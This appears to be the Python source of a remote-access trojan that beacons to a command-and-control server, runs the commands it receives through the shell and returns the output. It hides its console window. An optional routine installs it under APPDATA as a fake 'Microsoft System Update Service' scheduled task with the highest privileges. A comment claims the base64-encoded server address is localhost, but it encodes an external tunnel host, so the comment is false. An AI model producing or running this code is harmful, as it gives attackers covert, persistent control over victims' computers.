mport requests
import time
import subprocess
import platform
import uuid
import os
import base64
import sys
import shutil

# --- Configuration ---
# Obfuscated C2 URL to make it less obvious.
# This is "http://localhost:8080" base64 encoded.
C2_URL_B64 = "aHR0cDovL2hpdC13ZWRkaW5nLmdsLmF0LnBseS5nZzo1OTEwMg=="
# -------------------

# --- Windows-Specific Persistence and Stealth ---
def is_windows():
    return platform.system() == "Windows"

def hide_console():
    """Hides the console window on Windows."""
    if is_windows():
        try:
            import ctypes
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except Exception as e:
            print(f"Error hiding console: {e}")

def setup_persistence():
    """Establishes persistence on Windows by creating a scheduled task."""
    if not is_windows():
        return # Persistence is Windows-only for this agent

    try:
        appdata_path = os.getenv('APPDATA')
        agent_dir = os.path.join(appdata_path, 'SystemUpdater')
        agent_path = os.path.join(agent_dir, 'update_svc.exe')

        # If not running from the persistence location, copy self and set up task
        if os.path.abspath(sys.executable).lower() != agent_path.lower():
            os.makedirs(agent_dir, exist_ok=True)
            shutil.copy(sys.executable, agent_path)
            
            # Create a scheduled task to run on user logon
            command = (
                f'schtasks /create /tn "Microsoft System Update Service" '
                f'/tr "{agent_path}" /sc onlogon /rl HIGHEST /f'
            )
            subprocess.run(command, shell=True, capture_output=True)
            
            # Optional: Run the new process and exit the current one
            subprocess.Popen([agent_path])
            sys.exit(0)
    except Exception as e:
        print(f"Persistence setup failed: {e}")


class SmartAgent:
    def __init__(self):
        self.agent_id = str(uuid.uuid4())
        self.hostname = platform.node()
        self.os_type = platform.system()
        self.c2_url = base64.b64decode(C2_URL_B64).decode('utf-8')
        self.mode = "beacon" # or "live"
        self.beacon_interval = 30
        self.live_interval = 2

    def register(self):
        """Registers the agent with the C2 server."""
        register_url = f"{self.c2_url}/api/register"
        payload = {"agentId": self.agent_id, "os": self.os_type, "hostname": self.hostname}
        try:
            requests.post(register_url, json=payload, timeout=10)
            return True
        except requests.exceptions.RequestException:
            return False

    def beacon(self):
        """Sends a beacon to the C2 to get commands."""
        beacon_url = f"{self.c2_url}/api/beacon"
        payload = {"agentId": self.agent_id}
        try:
            response = requests.post(beacon_url, json=payload, timeout=10)
            return response.json().get("commands", [])
        except requests.exceptions.RequestException:
            return []

    def send_results(self, results):
        """Sends the results of a command back to the C2."""
        results_url = f"{self.c2_url}/api/results"
        payload = {"agentId": self.agent_id, "results": results}
        try:
            requests.post(results_url, json=payload, timeout=10)
        except requests.exceptions.RequestException:
            pass # Fail silently

    def execute_command(self, command):
        """Executes a command and returns the output."""
        if command.lower().startswith('cd '):
            try:
                path = command.strip().split(maxsplit=1)[1]
                os.chdir(os.path.expanduser(path))
                return f"Changed directory to {os.getcwd()}"
            except Exception as e:
                return str(e)
        
        try:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = proc.communicate(timeout=30)
            output = (stdout or b"") + (stderr or b"")
            return output.decode('utf-8', errors='ignore').strip()
        except subprocess.TimeoutExpired:
            return "Command timed out."
        except Exception as e:
            return f"Error executing command: {e}"

    def handle_special_commands(self, command):
        """Check for and handle mode-switching commands."""
        if command.lower() == "start_live":
            self.mode = "live"
            self.send_results("[+] Switched to live mode. Polling every 2 seconds.")
            return True
        if command.lower() == "stop_live":
            self.mode = "beacon"
            self.send_results("[+] Switched to beacon mode. Polling every 30 seconds.")
            return True
        return False

    def start(self):
        """Starts the main agent loop."""
        while not self.register():
            time.sleep(60) # Wait a minute before retrying registration

        while True:
            commands = self.beacon()
            if commands:
                for command in commands:
                    if not self.handle_special_commands(command):
                        results = self.execute_command(command)
                        self.send_results(results)
            
            interval = self.live_interval if self.mode == "live" else self.beacon_interval
            time.sleep(interval)

if __name__ == "__main__":
    hide_console()
    # Uncomment the line below to enable persistence when you compile the EXE
    # setup_persistence() 
    
    agent = SmartAgent()
    agent.start()
